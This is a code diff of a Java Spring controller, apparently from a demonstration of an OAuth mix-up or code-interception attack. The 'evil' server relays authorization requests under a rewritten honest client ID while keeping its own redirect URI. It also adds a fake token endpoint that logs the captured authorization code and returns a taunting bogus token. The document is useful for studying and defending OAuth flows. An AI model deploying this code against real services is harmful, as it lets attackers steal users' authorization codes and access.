@@ -1,9 +1,10 @@
 package com.example.evil;
 
 import org.springframework.stereotype.Controller;
-import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseBody;
 
 @Controller
 public class HomeController {
@@ -25,13 +26,14 @@ public class HomeController {
 				clientId.replace("evil", "honest"),
 				scope,
 				state,
-				redirectUri.replace("evil", "honest")
+				redirectUri
 		);
 	}
 
-	@GetMapping("/.honest-client")
-	public String authorize(Model model,  @RequestParam String code) {
-		model.addAttribute("code", code);
-		return "authorized";
+	@PostMapping(value = "/oauth2/token", produces = "application/json")
+	@ResponseBody
+	public String token(@RequestParam String code) {
+		System.out.println("code = " + code);
+		return "{\"access_token\":\"I have your code. You may leave now.\",\"refresh_token\":\"refresh\",\"scope\":\"scopes\",\"token_type\":\"Bearer\",\"expires_in\":\"300\"}";
 	}
 }
